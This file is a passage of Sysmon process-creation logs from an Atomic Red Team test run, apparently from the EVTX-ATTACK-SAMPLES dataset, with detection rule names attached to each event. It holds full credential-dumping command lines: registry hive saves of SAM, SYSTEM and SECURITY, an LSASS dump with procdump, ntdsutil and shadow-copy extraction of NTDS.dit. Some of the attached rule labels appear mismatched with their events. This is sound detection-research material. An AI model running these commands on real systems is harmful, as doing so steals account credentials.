2019-07-19T15:11:17.149274+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4116,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5840
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-DD47-5D31-0000-001015874900
ProcessId: 6264
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD95-5D31-0000-0010D6914A00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 15:11:17.139
"
2019-07-19T15:11:17.224751+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4117,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5840
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-DD47-5D31-0000-001015874900
ProcessId: 7140
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD95-5D31-0000-001075964A00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg save HKLM\sam sam""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 15:11:17.211
"
2019-07-19T15:11:17.243643+00:00,Dumping of Sensitive Hives Via Reg.EXE;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4118,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg save HKLM\sam sam""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 7140
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-DD95-5D31-0000-001075964A00
ProcessId: 868
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD95-5D31-0000-0010C7984A00
CommandLine: reg  save HKLM\sam sam
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 15:11:17.238
"
2019-07-19T15:11:21.090401+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4119,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5840
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-DD47-5D31-0000-001015874900
ProcessId: 4080
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD99-5D31-0000-001069A34A00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg save HKLM\system system""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 15:11:21.069
"
2019-07-19T15:11:21.105496+00:00,Dumping of Sensitive Hives Via Reg.EXE;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4120,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg save HKLM\system system""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4080
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-DD99-5D31-0000-001069A34A00
ProcessId: 1136
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD99-5D31-0000-0010BBA54A00
CommandLine: reg  save HKLM\system system
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 15:11:21.101
"
2019-07-19T15:11:23.317303+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4121,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5840
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-DD47-5D31-0000-001015874900
ProcessId: 7164
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD9B-5D31-0000-00106C1C4B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg save HKLM\security security""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 15:11:23.302
"
2019-07-19T15:11:23.336763+00:00,Dumping of Sensitive Hives Via Reg.EXE;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4122,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg save HKLM\security security""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 7164
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-DD9B-5D31-0000-00106C1C4B00
ProcessId: 4464
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD9B-5D31-0000-0010BE1E4B00
CommandLine: reg  save HKLM\security security
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 15:11:23.333
"
2019-07-19T15:11:26.549874+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4123,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5840
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-DD47-5D31-0000-001015874900
ProcessId: 3016
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD9E-5D31-0000-0010CB274B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 15:11:26.535
"
2019-07-19T15:11:26.642464+00:00,Copy .DMP/.DUMP Files From Remote Share Via Cmd.EXE;HackTool - HandleKatz LSASS Dumper Execution;Hacktool - EDR-Freeze Execution;LSASS Dump Keyword In CommandLine;Potential SysInternals ProcDump Evasion;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4124,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5840
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-DD47-5D31-0000-001015874900
ProcessId: 5488
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD9E-5D31-0000-00106E2C4B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 15:11:26.626
"
2019-07-19T15:11:26.686585+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4125,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5840
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-DD47-5D31-0000-001015874900
ProcessId: 264
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD9E-5D31-0000-00109A2F4B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 15:11:26.673
"
2019-07-19T15:11:26.852817+00:00,Hacktool - EDR-Freeze Execution;Suspicious Process Patterns NTDS.DIT Exfil;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4126,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5840
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-DD47-5D31-0000-001015874900
ProcessId: 584
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD9E-5D31-0000-001059374B00
CommandLine: ""\""C:\\Windows\\system32\\cmd.exe\"" /c \""ntdsutil â€œac i ntdsâ€\x9D â€œifmâ€\x9D â€œcreate full C:\\Atomic_Red_Team q q\""""
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 15:11:26.845
"
2019-07-19T15:11:26.884595+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4127,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5840
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-DD47-5D31-0000-001015874900
ProcessId: 4208
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD9E-5D31-0000-00106D3A4B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 15:11:26.875
"
2019-07-19T15:11:26.971596+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4128,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5840
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-DD47-5D31-0000-001015874900
ProcessId: 5036
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD9E-5D31-0000-00100C3F4B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""vssadmin.exe create shadow /for=C:""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 15:11:26.958
"
2019-07-19T15:11:26.989143+00:00,Hacktool - EDR-Freeze Execution;Shadow Copies Creation Using Operating Systems Utilities;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4129,MSEDGEWIN10,"Image: C:\Windows\System32\vssadmin.exe
RuleName: ''
Description: 'Command Line Interface for Microsoft® Volume Shadow Copy Service '
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""vssadmin.exe create shadow /for=C:""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5036
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=AC561205CD59BBCDB158525978FF65BDF17FDC3C,MD5=614B5C4238977130AA2270C8AD58CE6C,SHA256=D7577FB88CCA3169C7931DC0D8EC9A444227DC14F6C71D6D39D86A0C5CAD1976,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE
ParentProcessGuid: 747F3D96-DD9E-5D31-0000-00100C3F4B00
ProcessId: 6584
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD9E-5D31-0000-00105E414B00
CommandLine: 'vssadmin.exe  create shadow /for=C:'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 15:11:26.981
"
2019-07-19T15:11:27.082080+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4130,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5840
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-DD47-5D31-0000-001015874900
ProcessId: 3344
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD9F-5D31-0000-00107B454B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 15:11:27.069
"
2019-07-19T15:11:27.169217+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4131,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5840
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-DD47-5D31-0000-001015874900
ProcessId: 5772
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD9F-5D31-0000-00101A4A4B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Extract\ntds.dit""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 15:11:27.156
"
2019-07-19T15:11:27.202862+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4132,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5840
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-DD47-5D31-0000-001015874900
ProcessId: 976
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD9F-5D31-0000-00102D4D4B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Extract\VSC_SYSTEM_HIVE""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 15:11:27.192
"
2019-07-19T15:11:27.233257+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4133,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5840
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-DD47-5D31-0000-001015874900
ProcessId: 6508
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD9F-5D31-0000-001041504B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg save HKLM\SYSTEM C:\Extract\SYSTEM_HIVE""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 15:11:27.220
"
2019-07-19T15:11:27.258254+00:00,Dumping of Sensitive Hives Via Reg.EXE;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4134,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg save HKLM\SYSTEM C:\Extract\SYSTEM_HIVE""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6508
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-DD9F-5D31-0000-001041504B00
ProcessId: 6536
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-DD9F-5D31-0000-00108D524B00
CommandLine: reg  save HKLM\SYSTEM C:\Extract\SYSTEM_HIVE
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 15:11:27.254
"
2019-07-19T15:11:50.764089+00:00,CobaltStrike Load by Rundll32;Hacktool - EDR-Freeze Execution;Rundll32 Registered COM Objects,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4135,MSEDGEWIN10,"Image: C:\Windows\System32\rundll32.exe
RuleName: ''
Description: Windows host process (Rundll32)
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 804
LogonGuid: 747F3D96-D4B4-5D31-0000-0020FF090500
Hashes: SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: 747F3D96-D4A4-5D31-0000-0010DD6D0000
ProcessId: 3952
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-DDB6-5D31-0000-0010273D4C00
CommandLine: C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x509ff'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-07-19 15:11:50.383
"
2019-07-19T15:12:05.755598+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,4136,MSEDGEWIN10,"Image: C:\Windows\System32\notepad.exe
RuleName: ''
Description: Notepad
TerminalSessionId: 1
ParentCommandLine: C:\Windows\Explorer.EXE
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4416
